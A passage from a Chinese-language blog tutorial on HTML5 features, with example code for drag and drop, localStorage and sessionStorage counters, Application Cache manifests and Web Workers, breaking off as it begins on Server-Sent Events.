class="headerlink" title="拖放"></a>拖放</h2><p>拖放（Drag 和 Drop）指的是抓取某物并拖入不同的位置。</p><p>HTML5 中任何元素都是可拖放的。</p><p><em>（这里我还不是很明白，后面具体看看 JavaScript 的时候再回来看一看</em></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token id">#divmiao1</span> </span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">10</span>px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#aaaaaa</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">allowDrop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drag</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">,</span>ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> data<span class="token operator">=</span>ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>请把图片拖放到矩形中：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>divmiao1<span class="token punctuation">"</span></span> <span class="token attr-name">ondrop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drop(event)<span class="token punctuation">"</span></span> <span class="token attr-name">ondragover</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>allowDrop(event)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drag1<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Advanced/start_again.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">draggable</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">ondragstart</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drag(event)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><style type="text/css">    #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;}</style><script type="text/javascript">    function allowDrop(ev)    {        ev.preventDefault();    }    function drag(ev)    {        ev.dataTransfer.setData("Text",ev.target.id);    }    function drop(ev)    {        ev.preventDefault();        var data=ev.dataTransfer.getData("Text");        ev.target.appendChild(document.getElementById(data));    }</script><p>请把图片拖放到矩形中：</p><div id="divmiao1" ondrop="drop(event)" ondragover="allowDrop(event)"></div><br><img id="drag1" src="/2020/02/18/FrontEnd_HTML_Advanced/start_again.jpg" draggable="true" ondragstart="drag(event)"><br><h3 id="draggable"><a href="#draggable" class="headerlink" title="draggable"></a>draggable</h3><p>首先需要把想要拖动的元素新增一个 <code>draggable</code> 属性，即 <code>&lt;img draggable="true"&gt;</code>。</p><p>然后，规定当元素被拖动时发生的事情。</p><h3 id="ondragstart"><a href="#ondragstart" class="headerlink" title="ondragstart"></a>ondragstart</h3><p><code>ondragstart</code> 属性调用了一个 <code>drag(event)</code> 函数，规定拖动什么数据。</p><p>dataTransfer.setData() 方法设置被拖动数据的数据类型和值。这里的数据类型是 “text”，而值是这个可拖动元素的 id (“drag1”)。</p><h3 id="ondragover"><a href="#ondragover" class="headerlink" title="ondragover"></a>ondragover</h3><p><code>ondragover</code> 事件规定被拖动的数据能够被放置到何处。</p><p>默认地，数据/元素无法被放置到其他元素中。为了实现拖放，我们必须阻止元素的这种默认的处理方式。</p><p>这个任务由 ondragover 事件的 event.preventDefault() 方法完成。</p><h3 id="ondrop"><a href="#ondrop" class="headerlink" title="ondrop"></a>ondrop</h3><p>当放开被拖数据时，会发生 drop 事件。</p><p>在上面的例子中，ondrop 属性调用了一个函数，drop(event)。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>调用 <code>preventDefault()</code> 来阻止数据的浏览器默认处理方式（drop 事件的默认行为是以链接形式打开）</li><li>通过 <code>dataTransfer.getData()</code> 方法获得被拖的数据。该方法将返回在 <code>setData()</code> 方法中设置为相同类型的任何数据</li><li>被拖数据是被拖元素的 id (“drag1”)</li><li>把被拖元素追加到放置元素中</li></ul><br><hr><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><p>通过本地存储<em>（Local Storage）</em>，web 应用程序能够在用户浏览器中对数据进行本地的存储。</p><p>在 HTML5 之前，应用程序数据只能存储在 cookie 中，包括每个服务器请求。</p><p>本地存储则更安全，并且可在不影响网站性能的前提下将大量数据存储于本地。</p><p>与 cookie 不同，存储限制要大得多（至少5MB），并且信息不会被传输到服务器。</p><br><p>HTML 本地存储提供了两个在客户端存储数据的对象：</p><ul><li>window.localStorage - <strong>存储没有截止日期的数据</strong>，当浏览器被关闭时数据<strong>不会被删除</strong></li><li>window.sessionStorage - 针对一个 <strong>session</strong> 来存储数据，当关闭浏览器标签页时<strong>数据会丢失</strong></li></ul><h3 id="localStorage-对象"><a href="#localStorage-对象" class="headerlink" title="localStorage 对象"></a>localStorage 对象</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test_result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token comment" spellcheck="true">// Check browser support</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 存储 Store</span>    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">,</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 取回 Retrieve</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><div id="test_result"></div><script>// Check browser supportif (typeof(Storage) !== "undefined") {    // 存储 Store    localStorage.setItem("website", "https://miaotony.xyz");    // 取回 Retrieve    document.getElementById("test_result").innerHTML = localStorage.getItem("website");} else {    document.getElementById("test_result").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";}</script><br><p>首先创建 localStorage 名称/值对，其中：name=”website”，value=”<a href="https://miaotony.xyz&quot;">https://miaotony.xyz"</a></p><p>而后取回 “website” 的值，并把它插到 id=”test_result” 的元素中。</p><p>也可以把名称作为一个属性来使用，比如：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 存储</span>localStorage<span class="token punctuation">.</span>website <span class="token operator">=</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 取回</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span>website<span class="token punctuation">;</span></code></pre><p><strong>删除</strong>某一 localStorage 项目的语法：</p><pre class=" language-JavaScript"><code class="language-JavaScript">localStorage.removeItem("website");</code></pre><p>名称/值对<strong>始终存储为字符串</strong>。如果需要请记得把它们转换为其他格式！</p><p>下面这个对用户点击按钮的次数进行计数。在代码中，值字符串被转换为数值，依次对计数进行递增：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"您已经点击这个按钮 "</span> <span class="token operator">+</span> localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" 次。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clickCounter1()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请点击这里！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><script>function clickCounter1() {    if(typeof(Storage) !== "undefined") {        if (localStorage.clickcount) {            localStorage.clickcount = Number(localStorage.clickcount)+1;        } else {            localStorage.clickcount = 1;        }        document.getElementById("result2").innerHTML = "您已经点击这个按钮 " + localStorage.clickcount + " 次。";    } else {        document.getElementById("result2").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";    }}</script><p><button onclick="clickCounter1()" type="button">请点击这里！</button></p><br><div id="result2"></div><br><p>点击之后计数器将递增，且关闭这个网页/浏览器再打开这个页面，数字会从上一次的位置递增，<strong>不会重置</strong>。</p><h3 id="sessionStorage-对象"><a href="#sessionStorage-对象" class="headerlink" title="sessionStorage 对象"></a>sessionStorage 对象</h3><p>sessionStorage 对象等同 localStorage 对象，不同之处在于<strong>只对一个 session 存储数据</strong>。如果用户关闭具体的浏览器标签页，<strong>数据也会被删除</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"在本 session 中，您已经点击这个按钮 "</span> <span class="token operator">+</span> sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" 次。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clickCounter2()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请点击这里<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><script>function clickCounter2() {    if(typeof(Storage) !== "undefined") {        if (sessionStorage.clickcount) {            sessionStorage.clickcount = Number(sessionStorage.clickcount)+1;        } else {            sessionStorage.clickcount = 1;        }        document.getElementById("result3").innerHTML = "在本 session 中，您已经点击这个按钮 " + sessionStorage.clickcount + " 次。";    } else {        document.getElementById("result3").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";    }}</script><p><button onclick="clickCounter2()" type="button">请点击这里</button></p><br><div id="result3"></div><br><p>点击之后计数器也将递增，但是关闭这个网页/浏览器再打开这个页面，数字不会从上一次的位置递增，<strong>直接重置</strong>。</p><p>当然，刷新的话还是同一个 session，所以还是保留的。</p><p>按下 F12，在<strong>存储</strong>里也可以看得到<strong>会话存储</strong>和<strong>本地存储</strong>。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/sessionStorage.png" alt="sessionStorage"></p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/localStorage.png" alt="localStorage"></p><br><hr><h2 id="应用程序缓存"><a href="#应用程序缓存" class="headerlink" title="应用程序缓存"></a>应用程序缓存</h2><p><strong>使用应用程序缓存<em>（Application Cache）</em>，通过创建 cache manifest 文件，可轻松创建 web 应用的离线版本。</strong></p><h3 id="Cache-Manifest-基础"><a href="#Cache-Manifest-基础" class="headerlink" title="Cache Manifest 基础"></a>Cache Manifest 基础</h3><p>如需启用应用程序缓存，需要在文档的 <code>&lt;html&gt;</code> 标签中包含 <code>manifest</code> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE HTML></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">manifest</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo.appcache<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。</p><p>manifest 文件的建议文件扩展名是：”.appcache”。</p><p>manifest 文件需要设置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。</p><h3 id="Manifest-文件"><a href="#Manifest-文件" class="headerlink" title="Manifest 文件"></a>Manifest 文件</h3><p>manifest 文件是简单的文本文件，用来告知浏览器被缓存的内容（以及不缓存的内容）。</p><p>包含三个部分：</p><ul><li>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存</li><li>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存</li><li>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）</li></ul><p>完整范例：</p><pre><code>CACHE MANIFEST# 2020-02-20 v1.0.0/theme.css/logo.gif/main.jsNETWORK:*FALLBACK:/html/ /offline.html</code></pre><p>第一行，<code>CACHE MANIFEST</code>，是必需的。</p><p><code>NETWORK</code> 中，可以使用星号来指示所有其他其他资源/文件都需要联网。</p><p><code>FALLBACK</code> 中，规定如果无法建立因特网连接，则用 “offline.html” 替代 /html/ 目录中的所有文件。</p><p>一旦应用被缓存，它就会保持缓存，更新缓存有以下这几种情况。</p><ul><li>用户清空浏览器缓存</li><li>manifest 文件被修改</li><li>由程序来更新应用缓存</li></ul><p>以 “#” 开头的是注释行，但也可满足其他用途。应用的缓存只会在其 manifest 文件改变时被更新。</p><p>更新注释行中的日期和版本号就可以让浏览器重新缓存文件。</p><br><hr><h2 id="Web-Workers"><a href="#Web-Workers" class="headerlink" title="Web Workers"></a>Web Workers</h2><p>Web worker 是运行在后台的 JavaScript，不会影响页面的性能。</p><p>当在 HTML 页面中执行脚本时，在脚本执行结束之前页面是不可响应的。使用 Web worker 就可以独立于其他脚本来在后台执行，前台照样可以进行点击、选取内容等等操作。</p><p>通常用于耗费 CPU 资源的任务。</p><p>由于 web worker 位于外部文件中，它们无法访问下例 JavaScript 对象：</p><ul><li>window 对象</li><li>document 对象</li><li>parent 对象</li></ul><p>首先需要<strong>创建一个 web worker 文件</strong>，比如这里创建了一个计数的脚本。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">postMessage</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"timedCount()"</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中的 <code>postMessage()</code> 方法<strong>用于向 HTML 页面传回一段消息</strong>。</p><p>而后在 HTML 中<strong>创建一个 Web Worker 对象</strong>，运行上面文件中的代码。</p><pre class=" language-javascript"><code class="language-javascript">w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后让 Web Worker 监听 <code>onmessage</code> 事件。</p><p>当 web worker 传送消息时，会执行事件监听器中的代码。来自 web worker 的数据会存储于 event.data 中。</p><pre class=" language-javascript"><code class="language-javascript">w<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>创建 web worker 后，它会继续监听消息（即使在外部脚本完成后）直到其被终止为止。</p><p>需要终止这个 web worker，并释放浏览器/计算机资源，可以使用 terminate() 方法。</p><p>终止后再将原来的变量（w）设置为 <code>undefined</code>，则又可以复用代码啦！</p><p>HTML中的完整代码如下。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Count numbers: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>startWorker()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Start Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stopWorker()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Stop Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> w<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">startWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Worker<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        w<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Sorry! No Web Worker support."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stopWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     w<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    w <span class="token operator">=</span> undefined<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><br><hr><h2 id="Server-Sent-事件"><a href="#Server-Sent-事件" class="headerlink" title="Server-Sent 事件"></a>Server-Sent 事件</h2><p>Server-Sent 事件<em>（SSE）</em>指的是网页自动从服务器获得更新。</p><p><strong>EventSource 对象用于接收服务器发送事件通知。</strong></p><p>它有这几种方法：</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>onopen</td><td>当通往服务器的连接被打开</td></tr><tr><td>onmessage</td><td>当接收到消息</td></tr><tr><td>onerror</td><td>当发生错误</td></tr></tbody></table><p>最常用的就 <code>onmessage</code> 